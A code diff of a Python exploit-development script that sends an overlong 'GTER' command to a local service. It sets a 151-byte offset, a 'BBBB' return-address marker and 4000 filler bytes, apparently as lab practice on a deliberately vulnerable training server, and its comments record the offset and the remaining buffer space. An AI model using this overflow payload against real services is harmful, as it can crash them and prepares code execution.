@@ -1,13 +1,13 @@
 import socket
 from time import sleep
 ip = "127.0.0.1"
-port= 9999
+port= int(input("Port : "))
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((ip,port))
 data=s.recv(1024)
 pattern="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af"
-pattern="A"*151+"BBBBCCCCCCCC"
-buffer="GTER "+pattern+"\r\n\r\n"
+pattern="A"*151+"BBBB"
+buffer="GTER "+pattern+"C"*4000+"\r\n\r\n"
 
 s.send(buffer)
 data=s.recv(1024)
@@ -15,9 +15,9 @@ print(data+str(len(buffer)))
 sleep(1)
 
 
-#===>>>  ==> Exact match at offset 151 
+#===>>>  ==> Exact match at offset 151  ***varified
 
-
+# ===>>>   ==> ==> ==> only 20 byte of "C" are written, that we have only 20 byte space now 
 
 
 
